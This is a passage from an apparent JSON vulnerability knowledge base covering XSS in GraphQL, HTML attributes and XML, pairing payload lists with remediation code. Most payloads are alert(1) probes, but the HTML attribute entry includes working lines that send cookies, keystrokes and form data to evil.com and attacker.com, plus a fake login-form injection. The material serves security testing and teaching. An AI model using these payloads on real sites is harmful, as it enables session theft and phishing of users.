    "attack_vector": "\nGRAPHQL XSS ATTACK VECTORS:\n\n1. QUERY PARAMETER INJECTION:\n   GraphQL query with user input:\n   query GetUser($id: ID!) {\n     user(id: $id) {\n       name\n       bio\n     }\n   }\n\n   Variables:\n   {\"id\": \"USER_INPUT\"}  # ID injection\n\n   If ID is reflected in response:\n   {\"data\": {\"user\": {\"name\": \"<script>alert(1)</script>\", \"bio\": \"Bio\"}}}\n\n2. FIELD ALIAS INJECTION:\n   Query with alias injection:\n   query {\n     user_<script>alert(1)</script>: user(id: \"123\") {\n       name\n     }\n   }\n\n   Result may execute script in some parsers\n\n3. MUTATION INPUT INJECTION:\n   Mutation with user content:\n   mutation UpdateProfile($input: UpdateProfileInput!) {\n     updateProfile(input: $input) {\n       profile {\n         displayName\n         status\n       }\n     }\n   }\n\n   Variables:\n   {\n     \"input\": {\n       \"displayName\": \"<script>alert(1)</script>\",  # Display name XSS\n       \"status\": \"Active\"\n     }\n   }\n\n4. SUBSCRIPTION INJECTION:\n   Real-time subscription with XSS:\n   subscription OnUserUpdate {\n     userUpdate {\n       message\n       content  # User-controlled content\n     }\n   }\n\n   Subscription data:\n   {\n     \"data\": {\n       \"userUpdate\": {\n         \"message\": \"Update\",\n         \"content\": \"<script>alert(1)</script>\"# Subscription XSS\n       }\n     }\n   }\n\n5. ERROR MESSAGE INJECTION:\n   Malformed query leading to XSS:\n   query {\n     user(id: \"<script>alert(1)</script>\") {# Invalid ID with XSS\n       name\n     }\n   }\n\n   Error response:\n   {\"errors\": [{\"message\": \"Invalid user ID: <script>alert(1)</script>\"}]}\n\nADVANCED GRAPHQL XSS TECHNIQUES:\n\n6. INTROSPECTION QUERY INJECTION:\n   Introspection with XSS:\n   query IntrospectionQuery {\n     __schema {\n       queryType {\n         name\n         description# Description might be user-controlled\n       }\n     }\n   }\n\n7. FRAGMENT INJECTION:\n   Fragment with malicious content:\n   query {\n     user(id: \"123\") {\n       ...UserFields\n     }\n   }\n\n   fragment UserFields on User {\n     name\n     bio_<script>alert(1)</script>: bio# Fragment alias XSS\n   }\n\n8. DIRECTIVE INJECTION:\n   Directives with XSS:\n   query {\n     user(id: \"123\") @include(if: USER_INPUT) {# Directive injection\n       name\n     }\n   }\n\n   Attack payload:\n   true) { name } <script>alert(1)</script> #\n\n9. VARIABLE INJECTION:\n   Complex variable injection:\n   query GetUsers($filter: String!) {\n     users(filter: $filter) {\n       name\n       profile {\n         bio\n       }\n     }\n   }\n\n   Variables:\n   {\"filter\": \"name:<script>alert(1)</script>\"}# Filter XSS\n\n10. BATCH QUERY INJECTION:\n    Batch queries with XSS:\n    [\n      {\"query\": \"query { user(id: \\\"<script>alert(1)</script>\\\") { name } }\"},\n      {\"query\": \"query { settings { theme } }\"}\n    ]\n\n11. SCHEMA FIELD INJECTION:\n    Schema with malicious field names:\n    type User {\n      name: String\n      <script>alert(1)</script>: String# Field name XSS\n    }\n\n12. ENUM VALUE INJECTION:\n    Enum with XSS values:\n    enum UserStatus {\n      ACTIVE\n      INACTIVE\n      <script>alert(1)</script># Enum value XSS\n    }\n\n13. UNION TYPE INJECTION:\n    Union types with XSS:\n    union SearchResult = User | Post | <script>alert(1)</script># Union XSS\n\n14. INTERFACE INJECTION:\n    Interface with malicious fields:\n    interface Node {\n      id: ID!\n      <script>alert(1)</script>: String# Interface field XSS\n    }\n\n15. SCALAR TYPE INJECTION:\n    Custom scalar with XSS:\n    scalar JSON\n    scalar <script>alert(1)</script># Scalar name XSS\n\nGRAPHQL-SPECIFIC BYPASSES:\n\n16. QUERY DEPTH INJECTION:\n    Deep query with XSS:\n    query {\n      user(id: \"123\") {\n        profile {\n          settings {\n            theme {\n              name\n              <script>alert(1)</script>: value# Deep field XSS\n            }\n          }\n        }\n      }\n    }\n\n17. OPERATION NAME INJECTION:\n    Operation name with XSS:\n    query <script>alert(1)</script> {# Operation name XSS\n      user(id: \"123\") {\n        name\n      }\n    }\n\n18. COMMENT INJECTION:\n    GraphQL comments with XSS:\n    query {\n      # <script>alert(1)</script># Comment XSS\n      user(id: \"123\") {\n        name\n      }\n    }\n\n19. STRING ESCAPE BYPASS:\n    Escaped strings with XSS:\n    {\"id\": \"\\\"<script>alert(1)</script>\\\"\"}# Escaped XSS\n\n20. BLOCK STRING INJECTION:\n    Block strings with XSS:\n    query {\n      user(id: \"123\") {\n        bio(description: \"\"\"\n          <script>alert(1)</script>  # Block string XSS\n        \"\"\")\n      }\n    }\n\nREAL-WORLD ATTACK SCENARIOS:\n\n21. SOCIAL MEDIA API:\n    - GraphQL API for posts\n    - Post content: <script>alert(1)</script>\n    - Displayed in feed\n    - Feed-based XSS attacks\n\n22. E-COMMERCE PLATFORM:\n    - Product search API\n    - Product name: <script>alert(1)</script>\n    - Search results XSS\n    - Shopping cart manipulation\n\n23. USER PROFILE SYSTEM:\n    - Profile update mutation\n    - Display name: <script>alert(1)</script>\n    - Profile display XSS\n    - Profile-based attacks\n\n24. CHAT APPLICATION:\n    - Real-time messaging API\n    - Message subscription: <script>alert(1)</script>\n    - Real-time XSS via subscriptions\n    - Chat hijacking\n\n25. COLLABORATION PLATFORM:\n    - Document sharing API\n    - Document title: <script>alert(1)</script>\n    - Document display XSS\n    - Collaboration hijacking\n\n26. ANALYTICS DASHBOARD:\n    - Metrics API\n    - Metric name: <script>alert(1)</script>\n    - Dashboard XSS\n    - Analytics manipulation\n\n27. MOBILE APPLICATION:\n    - GraphQL backend\n    - Mobile app consuming API\n    - API response: <script>alert(1)</script>\n    - Mobile app XSS\n\nGRAPHQL XSS DETECTION:\n\n28. MANUAL TESTING:\n    - GraphQL playground testing\n    - Query introspection analysis\n    - Mutation testing\n    - Subscription monitoring\n\n29. AUTOMATED SCANNING:\n    - GraphQL schema analysis\n    - Query injection testing\n    - Response sanitization validation\n    - Subscription security testing\n\n30. PROXY MONITORING:\n    - GraphQL traffic interception\n    - Query/response analysis\n    - Schema validation\n    - Error message inspection\n",
    "remediation": "\nGRAPHQL XSS DEFENSE STRATEGY:\n\n1. INPUT VALIDATION (PRIMARY DEFENSE):\n   Validate all GraphQL inputs:\n\n   function validateGraphQLInput(input, schema) {\n   # Type validation\n     if (!isValidType(input, schema.type)) {\n       throw new Error('Invalid input type');\n     }\n\n   # Length limits\n     if (typeof input === 'string' && input.length > MAX_STRING_LENGTH) {\n       throw new Error('Input too long');\n     }\n\n   # Pattern validation\n     if (schema.pattern && !schema.pattern.test(input)) {\n       throw new Error('Invalid input format');\n     }\n\n     return input;\n   }\n\n2. OUTPUT SANITIZATION:\n   Sanitize all GraphQL outputs:\n\n   function sanitizeGraphQLOutput(data) {\n     if (typeof data === 'string') {\n       return DOMPurify.sanitize(data, {\n         ALLOWED_TAGS: [],\n         ALLOWED_ATTR: []\n       });\n     }\n\n     if (Array.isArray(data)) {\n       return data.map(sanitizeGraphQLOutput);\n     }\n\n     if (typeof data === 'object' && data !== null) {\n       const sanitized = {};\n       for (const [key, value] of Object.entries(data)) {\n         sanitized[key] = sanitizeGraphQLOutput(value);\n       }\n       return sanitized;\n     }\n\n     return data;\n   }\n\n3. QUERY DEPTH LIMITATION:\n   Limit GraphQL query depth:\n\n   const MAX_DEPTH = 10;\n\n   function validateQueryDepth(query, depth = 0) {\n     if (depth > MAX_DEPTH) {\n       throw new Error('Query too deep');\n     }\n\n   # Recursively validate nested fields\n     for (const field of query.selectionSet.selections) {\n       if (field.selectionSet) {\n         validateQueryDepth(field, depth + 1);\n       }\n     }\n   }\n\n4. FIELD NAME VALIDATION:\n   Validate field names:\n\n   function isValidFieldName(name) {\n   # Must start with letter or underscore\n     if (!/^[a-zA-Z_]/.test(name)) return false;\n\n   # Must contain only alphanumeric and underscores\n     if (!/^[a-zA-Z0-9_]+$/.test(name)) return false;\n\n   # Must not contain XSS patterns\n     const dangerousPatterns = [\n       /script/i,\n       /javascript/i,\n       /on\\w+/i,\n       /<[^>]*>/i\n     ];\n\n     for (const pattern of dangerousPatterns) {\n       if (pattern.test(name)) return false;\n     }\n\n     return true;\n   }\n\n5. MUTATION INPUT SANITIZATION:\n   Sanitize mutation inputs:\n\n   function sanitizeMutationInput(input, schema) {\n     const sanitized = {};\n\n     for (const [field, value] of Object.entries(input)) {\n     # Validate field name\n       if (!isValidFieldName(field)) {\n         throw new Error('Invalid field name: ' + field);\n       }\n\n     # Sanitize field value\n       sanitized[field] = sanitizeGraphQLOutput(value);\n     }\n\n     return sanitized;\n   }\n\n6. SUBSCRIPTION SECURITY:\n   Secure GraphQL subscriptions:\n\n   function validateSubscriptionData(data) {\n   # Validate subscription payload\n     if (!isValidSubscriptionPayload(data)) {\n       throw new Error('Invalid subscription data');\n     }\n\n   # Sanitize subscription content\n     return sanitizeGraphQLOutput(data);\n   }\n\n7. ERROR MESSAGE SECURITY:\n   Secure error handling:\n\n   function handleGraphQLError(error) {\n     logger.error('GraphQL error', {\n       message: error.message,\n       path: error.path,\n       code: error.code\n     });\n\n   # Return generic error messages\n     return {\n       errors: [{\n         message: 'An error occurred',\n         extensions: {\n           code: 'INTERNAL_ERROR'\n         }\n       }]\n     };\n   }\n\n8. INTROSPECTION PROTECTION:\n   Control GraphQL introspection:\n\n   const introspectionRules = {\n     disableIntrospection: process.env.NODE_ENV === 'production',\n     allowedIntrospectionFields: ['__typename', '__schema'],\n     blockFieldSuggestion: true\n   };\n\n9. RATE LIMITING:\n   Implement GraphQL rate limiting:\n\n   const rateLimiter = new RateLimiter({\n     windowMs: 15 * 60 * 1000,# 15 minutes\n     max: 100,# limit each IP to 100 requests per windowMs\n     message: 'Too many GraphQL requests'\n   });\n\n10. SCHEMA VALIDATION:\n    Validate GraphQL schema:\n\n    function validateSchema(schema) {\n    # Check for dangerous field names\n      for (const type of Object.values(schema.getTypeMap())) {\n        if (type.name && !isValidFieldName(type.name)) {\n          throw new Error('Invalid type name: ' + type.name);\n        }\n\n        if (type.getFields) {\n          for (const [fieldName, field] of Object.entries(type.getFields())) {\n            if (!isValidFieldName(fieldName)) {\n              throw new Error('Invalid field name: ' + fieldName);\n            }\n          }\n        }\n      }\n    }\n\n11. QUERY COMPLEXITY ANALYSIS:\n    Analyze query complexity:\n\n    function analyzeQueryComplexity(query) {\n      let complexity = 0;\n\n    # Count selections\n      function countSelections(selectionSet) {\n        for (const selection of selectionSet.selections) {\n          complexity++;\n\n          if (selection.selectionSet) {\n            countSelections(selection.selectionSet);\n          }\n        }\n      }\n\n      countSelections(query.selectionSet);\n\n      if (complexity > MAX_COMPLEXITY) {\n        throw new Error('Query too complex');\n      }\n\n      return complexity;\n    }\n\n12. CSP FOR GRAPHQL:\n    Content Security Policy:\n\n    Content-Security-Policy:\n      default-src 'self';\n      script-src 'self' 'nonce-{random}';\n      connect-src 'self' https://api.graphql.org;\n      object-src 'none';\n\n13. AUTHENTICATION AND AUTHORIZATION:\n    Secure GraphQL operations:\n\n    function authenticateGraphQLRequest(context) {\n      const token = context.headers.authorization;\n\n      if (!token) {\n        throw new GraphQLError('Authentication required');\n      }\n\n      try {\n        const user = verifyToken(token);\n        context.user = user;\n        return user;\n      } catch (error) {\n        throw new GraphQLError('Invalid token');\n      }\n    }\n\n14. LOGGING AND MONITORING:\n    Comprehensive GraphQL monitoring:\n\n    function logGraphQLOperation(operation, context) {\n      logger.info('GraphQL operation', {\n        operationName: operation.name?.value,\n        operationType: operation.operation,\n        complexity: analyzeQueryComplexity(operation),\n        userId: context.user?.id,\n        timestamp: new Date().toISOString()\n      });\n    }\n\n15. TESTING AND VALIDATION:\n    Regular security testing:\n\n    Automated tests:\n    - GraphQL input validation\n    - Output sanitization testing\n    - Query complexity analysis\n    - Subscription security testing\n\n    Manual tests:\n    - GraphQL playground testing\n    - Schema introspection analysis\n    - Error message validation\n\nSECURITY TESTING PAYLOADS:\n\nBasic GraphQL XSS:\n{\"id\": \"<script>alert(1)</script>\"}\n{\"displayName\": \"<script>alert(1)</script>\"}\n{\"content\": \"<script>alert(1)</script>\"}\n\nQuery injection:\nquery { user(id: \"<script>alert(1)</script>\") { name } }\nmutation { updateProfile(input: { name: \"<script>alert(1)</script>\" }) { success } }\n\nAlias injection:\nquery { <script>alert(1)</script>: user(id: \"123\") { name } }\nfragment <script>alert(1)</script> on User { name }\n\nAdvanced payloads:\nquery { user(id: \"123\") { ...XSSFragment } } fragment XSSFragment on User { name bio: \"<script>alert(1)</script>\" }\nsubscription { userUpdate { message: \"<script>alert(1)</script>\" } }\n\nGRAPHQL SECURITY HEADERS:\n\nContent-Type: application/graphql\nX-GraphQL-Operation: query\nContent-Security-Policy: default-src 'self'\nX-Content-Type-Options: nosniff\n\nMONITORING METRICS:\n\nMonitor for:\n- Unusual query patterns\n- High query complexity\n- Error message anomalies\n- Subscription abuse\n- Rate limiting violations\n\nOWASP REFERENCES:\n- OWASP GraphQL Cheat Sheet\n- OWASP API Security Top 10\n- GraphQL Security Best Practices\n- API Security Testing Guide\n"
  },
  "html_attribute": {
    "title": "Cross-Site Scripting (XSS) in HTML Attribute",
    "severity": "critical",
    "cvss_score": 8.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "html",
      "attribute",
      "reflected",
      "stored",
      "injection"
    ],
    "description": "\nUser input is reflected inside an HTML tag's attribute without proper escaping. This is one of the most \ncommon XSS vectors in modern web applications. Attackers can break out of the attribute context to inject \nevent handlers, create new attributes, or even close the tag entirely to inject arbitrary HTML.\n\nVULNERABILITY CONTEXT:\nHTML attributes can contain user data in various contexts:\n- value=\"USER_INPUT\" in form fields\n- href=\"USER_INPUT\" in links\n- src=\"USER_INPUT\" in images/scripts\n- alt=\"USER_INPUT\" in images\n- title=\"USER_INPUT\" in tooltips\n- data-*=\"USER_INPUT\" in custom attributes\n- style=\"USER_INPUT\" in inline styles\n- onclick=\"USER_INPUT\" in event handlers\n- class=\"USER_INPUT\" in CSS classes\n- id=\"USER_INPUT\" in element IDs\n\nSpecial risk exists with attributes that can execute JavaScript:\n- href, src, action, formaction (URL attributes)\n- All event handlers (onclick, onload, onerror, etc.)\n- style (can contain expression() or url())\n- srcdoc in iframes\n\nSEVERITY: HIGH to CRITICAL\nDepends on the specific attribute and quoting style. Unquoted attributes are most dangerous.\n",
    "attack_vector": "\nBREAKING OUT OF QUOTED ATTRIBUTES:\n\n1. DOUBLE QUOTES:\n   Input in: <input value=\"USER_INPUT\">\n   \n   Basic breakout:\n   \" onload=alert(1) x=\"\n   Result: <input value=\"\" onload=alert(1) x=\"\">\n   \n   Autofocus technique:\n   \" onfocus=alert(1) autofocus x=\"\n   Result: <input value=\"\" onfocus=alert(1) autofocus x=\"\">\n   \n   Multiple events:\n   \" onmouseover=alert(1) onfocus=alert(1) autofocus x=\"\n\n2. SINGLE QUOTES:\n   Input in: <input value='USER_INPUT'>\n   \n   Basic breakout:\n   ' onload=alert(1) x='\n   Result: <input value='' onload=alert(1) x=''>\n   \n   With encoding:\n   &#39; onload=alert(1) x=&#39;\n   \n3. UNQUOTED ATTRIBUTES (Most Dangerous):\n   Input in: <input value=USER_INPUT>\n   \n   Direct injection (no quote needed):\n   x onload=alert(1)\n   Result: <input value=x onload=alert(1)>\n   \n   Alternative events:\n   x onfocus=alert(1) autofocus\n   x onmouseover=alert(1)\n   x onclick=alert(1)\n\n4. CLOSING TAG:\n   Input in: <div title=\"USER_INPUT\">\n   \n   Close tag and inject new content:\n   \"><script>alert(1)</script><div x=\"\n   Result: <div title=\"\"><script>alert(1)</script><div x=\"\">\n\nEVENT HANDLER INJECTION TECHNIQUES:\n\n5. AUTOFOCUS EVENTS (No user interaction):\n   \" onfocus=alert(1) autofocus \"\n   \" onfocus=alert(document.domain) autofocus \"\n   ' onfocus=alert`1` autofocus '\n\n6. ACCESSKEY (Social engineering):\n   \" accesskey=x onclick=alert(1) \"\n   (User presses Alt+X or Alt+Shift+X)\n   \n   \" accesskey=a onclick=alert(1) title=\"Press Alt+A to continue\" \"\n\n7. MODERN EVENT HANDLERS:\n   \n   Pointer events:\n   \" onpointerrawupdate=alert(1) \"\n   \" onpointerover=alert(1) \"\n   \" onpointerenter=alert(1) \"\n   \n   Auxiliary click:\n   \" onauxclick=alert(1) \"\n   (Triggered by middle mouse button)\n   \n   Toggle:\n   \" ontoggle=alert(1) \"\n   (For <details> elements)\n   \n   Animation events:\n   \" onanimationstart=alert(1) style=animation-name:x \"\n   \" onanimationend=alert(1) style=animation:x+1s \"\n   \n   Transition events:\n   \" ontransitionend=alert(1) style=transition:all+1s \"\n\n8. SVG/XML EVENT HANDLERS:\n   \" onbegin=alert(1) \" (SVG animations)\n   \" onend=alert(1) \" (SVG animations)\n   \" onrepeat=alert(1) \" (SVG animations)\n\n9. MUTATION EVENTS (Deprecated but still work):\n   \" onDOMActivate=alert(1) \"\n   \" onDOMFocusIn=alert(1) \"\n   \" onDOMSubtreeModified=alert(1) \"\n\n10. FORM-RELATED EVENTS:\n    \" oninput=alert(1) \"\n    \" onchange=alert(1) \"\n    \" oninvalid=alert(1) \"\n    \" onsubmit=alert(1) \"\n    \" onreset=alert(1) \"\n\nURL ATTRIBUTE EXPLOITATION:\n\n11. HREF ATTRIBUTE:\n    <a href=\"USER_INPUT\">Click</a>\n    \n    JavaScript protocol:\n    javascript:alert(1)\n    javascript:eval(atob('YWxlcnQoMSk='))\n    javascript:fetch('//evil.com?c='+document.cookie)\n    \n    Data URLs:\n    data:text/html,<script>alert(1)</script>\n    data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\n    \n    With encoding bypasses:\n    jav&#x09;ascript:alert(1)\n    jav&#x0A;ascript:alert(1)\n    &#106;avascript:alert(1)\n\n12. SRC ATTRIBUTE:\n    <img src=\"USER_INPUT\">\n    <script src=\"USER_INPUT\">\n    <iframe src=\"USER_INPUT\">\n    \n    JavaScript protocol:\n    javascript:alert(1)\n    \n    Data URLs:\n    data:text/html,<script>alert(1)</script>\n    \n    External malicious script:\n    //evil.com/xss.js\n    https://evil.com/xss.js\n\n13. FORMACTION ATTRIBUTE (HTML5):\n    <button formaction=\"USER_INPUT\">\n    <input type=\"submit\" formaction=\"USER_INPUT\">\n    \n    Hijack form submission:\n    javascript:alert(1)\n    //evil.com/steal\n\n14. ACTION ATTRIBUTE:\n    <form action=\"USER_INPUT\">\n    \n    Redirect form data:\n    javascript:alert(1)\n    //evil.com/phish\n\nADVANCED BYPASSES AND TECHNIQUES:\n\n15. HTML5 DATA ATTRIBUTES:\n    If JavaScript processes data-* attributes:\n    <div data-config=\"USER_INPUT\">\n    \n    Payload:\n    {\"exec\":\"alert(1)\"}\n    </div><script>alert(1)</script><div x=\"\n\n16. ARIA ATTRIBUTES:\n    \" aria-label=\"x\" onfocus=\"alert(1)\" autofocus x=\"\n    \" aria-describedby=\"x\" onmouseover=\"alert(1)\" x=\"\n\n17. STYLE ATTRIBUTE:\n    <div style=\"USER_INPUT\">\n    \n    Expression (IE):\n    expression(alert(1))\n    \n    Background with JavaScript (legacy):\n    background:url(javascript:alert(1))\n    \n    Import:\n    @import'javascript:alert(1)';\n    \n    Breaking out:\n    \" onload=alert(1) x=\"\n\n18. CLASS ATTRIBUTE EXPLOITATION:\n    If CSS has dangerous selectors:\n    <div class=\"USER_INPUT\">\n    \n    Payload:\n    \" onload=alert(1) x=\"\n    \n    Or exploit CSS injection if class affects styles\n\n19. TITLE ATTRIBUTE:\n    <div title=\"USER_INPUT\">\n    \n    Break out:\n    \" onmouseover=alert(1) x=\"\n    \" onclick=alert(1) x=\"\n\n20. CONTENTEDITABLE WITH EVENTS:\n    \" contenteditable onfocus=alert(1) autofocus x=\"\n\nENCODING BYPASSES:\n\n21. HTML ENTITY ENCODING:\n    &#34; = \"\n    &#39; = '\n    &#x22; = \"\n    &#x27; = '\n    \n    Payload:\n    &#34; onfocus=alert(1) autofocus x=&#34;\n\n22. URL ENCODING:\n    %22 = \"\n    %27 = '\n    %3C = <\n    %3E = >\n    \n    In href:\n    javascript:alert%281%29\n\n23. UNICODE ESCAPES:\n    \\u0022 = \"\n    \\u0027 = '\n    \n    In JavaScript contexts:\n    \" onclick=\"alert(\\u0031)\" \"\n\n24. NULL BYTES:\n    \"%00 onfocus=alert(1) autofocus x=\n    Some parsers stop at null byte\n\n25. NEWLINES AND TABS:\n    \"\\n onfocus=alert(1) autofocus x=\"\n    \"\\t onfocus=alert(1) autofocus x=\"\n\nREAL-WORLD ATTACK SCENARIOS:\n\nSTORED XSS VIA PROFILE:\nUser enters in \"Website\" field:\n\" onfocus=alert(document.cookie) autofocus x=\"\n\nRendered as:\n<input type=\"url\" value=\"\" onfocus=alert(document.cookie) autofocus x=\"\">\n\nSESSION HIJACKING:\n\" onfocus=\"fetch('//attacker.com?c='+btoa(document.cookie))\" autofocus x=\"\n\nKEYLOGGER:\n\" onfocus=\"document.onkeypress=function(e){fetch('//attacker.com?k='+e.key)}\" autofocus x=\"\n\nFORM HIJACKING:\n<button formaction=\"USER_INPUT\">Update Profile</button>\n\nPayload:\njavascript:fetch('//evil.com/steal',{method:'POST',body:new FormData(this.form)})\n\nCREDENTIAL THEFT:\n<a href=\"USER_INPUT\">Reset Password</a>\n\nPayload:\njavascript:document.body.innerHTML='<form action=//evil.com/phish><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form>'\n\nCLICKJACKING:\n\" style=\"position:fixed;top:0;left:0;width:100%;height:100%;opacity:0;cursor:pointer\" onclick=\"fetch('//evil.com/click')\" x=\"\n\nCONTEXT-SPECIFIC ATTACKS:\n\nSVG href:\n<svg><use href=\"USER_INPUT\">\n\nPayload:\ndata:image/svg+xml,<svg id=x onload=alert(1)>\n\nMeta refresh:\n<meta http-equiv=\"refresh\" content=\"0; url=USER_INPUT\">\n\nPayload:\njavascript:alert(1)\n\nLink prefetch:\n<link rel=\"prefetch\" href=\"USER_INPUT\">\n\nPayload:\n//evil.com/track\n",
    "remediation": "\nDEFENSE-IN-DEPTH STRATEGY:\n\n1. ATTRIBUTE-SPECIFIC ENCODING:\n   \n   For general attributes (value, title, alt, etc.):\n   - Encode: & < > \" '\n   - To: &amp; &lt; &gt; &quot; &#x27;\n   \n   Python:\n   import html\n   safe = html.escape(user_input, quote=True)\n   \n   PHP:\n   $safe = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');\n   \n   JavaScript:\n   function escapeAttr(text) {\n     return text\n       .replace(/&/g, '&amp;')\n       .replace(/</g, '&lt;')\n       .replace(/>/g, '&gt;')\n       .replace(/\"/g, '&quot;')\n       .replace(/'/g, '&#x27;');\n   }\n\n2. ALWAYS USE QUOTES:\n   \n   BAD (Unquoted):\n   <input value=<?php echo $user_input ?>>\n   \n   GOOD (Double quoted):\n   <input value=\"<?php echo htmlspecialchars($user_input, ENT_QUOTES) ?>\">\n   \n   PREFER DOUBLE QUOTES over single quotes (consistency)\n\n3. URL ATTRIBUTE VALIDATION:\n   \n   For href, src, action, formaction:\n   \n   Whitelist protocols:\n   allowed = ['http://', 'https://', 'mailto:', 'tel:']\n   \n   Python:\n   from urllib.parse import urlparse\n   \n   def is_safe_url(url):\n       if not url:\n           return False\n       parsed = urlparse(url)\n       return parsed.scheme in ['http', 'https', 'mailto', 'tel']\n   \n   if not is_safe_url(user_url):\n       raise ValueError('Invalid URL')\n   \n   JavaScript:\n   function isSafeURL(url) {\n       try {\n           const parsed = new URL(url, window.location.href);\n           return ['http:', 'https:', 'mailto:', 'tel:'].includes(parsed.protocol);\n       } catch {\n           return false;\n       }\n   }\n\n4. NEVER PLACE USER INPUT IN EVENT HANDLERS:\n   \n   BAD:\n   <div onclick=\"<?php echo $user_input ?>\">\n   <button onclick=\"doSomething('<?php echo $user_input ?>')\">\n   \n   GOOD:\n   Use data attributes + addEventListener:\n   <button id=\"myBtn\" data-value=\"<?php echo htmlspecialchars($user_input) ?>\">\n   \n   <script>\n   document.getElementById('myBtn').addEventListener('click', function() {\n       const value = this.dataset.value; // Safe\n       doSomething(value);\n   });\n   </script>\n\n5. CONTENT SECURITY POLICY:\n   \n   Restrict inline event handlers:\n   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'\n   \n   This blocks all inline event handlers (onclick, onload, etc.)\n\n6. FRAMEWORK AUTO-ESCAPING:\n   \n   React (Safe for attributes):\n   <input value={userInput} /> {/* Auto-escaped */}\n   <a href={userHref}>{/* React validates URL */}</a>\n   \n   Vue:\n   <input :value=\"userInput\"> <!-- Auto-escaped -->\n   <a :href=\"userHref\"> <!-- Sanitized -->\n   \n   Angular:\n   <input [value]=\"userInput\"> <!-- Auto-escaped -->\n   <a [href]=\"userHref\"> <!-- Sanitized by DomSanitizer -->\n   \n   DANGEROUS:\n   <div [attr.onclick]=\"userInput\"> <!-- Don't do this -->\n\n7. VALIDATE INPUT BEFORE OUTPUT:\n   \n   For expected formats:\n   \n   Email:\n   /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/\n   \n   Phone:\n   /^\\+?[0-9\\s\\-\\(\\)]{10,20}$/\n   \n   Username:\n   /^[a-zA-Z0-9_-]{3,20}$/\n   \n   URL (basic):\n   /^https?:\\/\\/.+/\n\n8. USE SAFE APIS:\n   \n   Setting attributes safely:\n   \n   GOOD:\n   element.setAttribute('title', userInput); // Auto-escaped\n   element.dataset.value = userInput; // Safe\n   element.value = userInput; // Safe for form inputs\n   \n   BAD:\n   element.innerHTML = '<div title=\"' + userInput + '\">'; // Dangerous\n   element.outerHTML = userInput; // Dangerous\n\n9. SANITIZE URLS:\n   \n   For href/src attributes:\n   \n   import { URL } from 'url';\n   \n   function sanitizeURL(url) {\n       try {\n           const parsed = new URL(url);\n           if (!['http:', 'https:', 'mailto:', 'tel:'].includes(parsed.protocol)) {\n               return '#'; // Safe fallback\n           }\n           return url;\n       } catch {\n           return '#'; // Invalid URL\n       }\n   }\n\n10. HTTPONLY COOKIES:\n    \n    Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict\n    \n    Prevents JavaScript access even if XSS exists\n\nSECURITY CHECKLIST:\n\n[ ] All attributes use proper HTML encoding\n[ ] All attributes are quoted (prefer double quotes)\n[ ] URL attributes validated against protocol whitelist\n[ ] No user input in event handler attributes\n[ ] No user input in style attributes\n[ ] Use data-* attributes + JavaScript instead of inline handlers\n[ ] CSP configured to block inline event handlers\n[ ] Framework auto-escaping enabled (not bypassed)\n[ ] Input validation for expected formats\n[ ] URL sanitization for href/src/action\n[ ] HTTPOnly flag on session cookies\n[ ] Regular security testing\n[ ] Code review for all attribute usage\n[ ] Use setAttribute() API, not string concatenation\n\nTESTING PAYLOADS:\n\nBasic breakout (double quotes):\n\" onfocus=alert(1) autofocus x=\"\n\nBasic breakout (single quotes):\n' onfocus=alert(1) autofocus x='\n\nUnquoted:\nx onfocus=alert(1) autofocus\n\nURL injection:\njavascript:alert(1)\ndata:text/html,<script>alert(1)</script>\n\nTag closing:\n\"><script>alert(1)</script><x x=\"\n\nEncoding bypass:\n&#34; onfocus=alert(1) autofocus x=&#34;\n\nOWASP REFERENCES:\n- OWASP XSS Prevention Cheat Sheet: Rule #2\n- CWE-79: Improper Neutralization of Input During Web Page Generation\n- OWASP Testing Guide: Testing for Reflected XSS\n- HTML5 Security Cheatsheet: https://html5sec.org\n"
  },
  "xml_content": {
    "title": "Cross-Site Scripting (XSS) in XML Context",
    "severity": "high",
    "cvss_score": 7.1,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "xml",
      "xhtml",
      "svg",
      "rss",
      "soap"
    ],
    "description": "\nUser input is reflected within XML or XHTML documents without proper encoding. XML-based XSS can \noccur in RSS feeds, SOAP web services, SVG files, or XHTML pages. The attack surface includes XML \nattributes, CDATA sections, and entity references.\n\nSEVERITY: MEDIUM to HIGH\nCommon in RSS feeds, SOAP APIs, and XHTML applications.\n",
    "attack_vector": "\nBASIC XML INJECTION:\n<item><title>USER_INPUT</title></item>\nPayload: </title><script>alert(1)</script><title>\n\nCDATA BREAKOUT:\n<![CDATA[USER_INPUT]]>\nPayload: ]]><script>alert(1)</script><![CDATA[\n\nXML ENTITIES:\n&lt;script&gt;alert(1)&lt;/script&gt;\nMay be decoded during processing\n\nXHTML INJECTION:\n<p>USER_INPUT</p>\nPayload: <img src=x onerror=\"alert(1)\"/>\n\nSOAP INJECTION:\nXML in SOAP messages can target both structure and embedded HTML\n\nRSS FEED XSS:\n<description>USER_INPUT</description>\n",
    "remediation": "\nDEFENSE:\n\n1. XML ENTITY ENCODING\n   Encode: &, <, >, \", '\n   To: &amp;, &lt;, &gt;, &quot;, &apos;\n\n2. USE XML LIBRARIES\n   Python: xml.etree.ElementTree, defusedxml\n   PHP: DOMDocument, SimpleXML\n   JavaScript: DOMParser\n\n3. VALIDATE WITH XML SCHEMA\n4. DISABLE EXTERNAL ENTITIES (prevent XXE)\n5. Apply HTML encoding for XHTML\n6. Use Content-Type: application/xml\n7. Implement CSP headers\n8. Validate SVG uploads\n\nPython:\nfrom defusedxml import ElementTree as ET\ntree = ET.fromstring(xml_content)\n\nPHP:\nlibxml_disable_entity_loader(true);\n\nOWASP REFERENCES:\n- CWE-79: Cross-site Scripting\n- CWE-611: XXE\n- OWASP XML Security Cheat Sheet\n"
  },
  "svg_context": {
    "title": "Cross-Site Scripting (XSS) in SVG Context",
    "severity": "high",
    "cvss_score": 7.3,
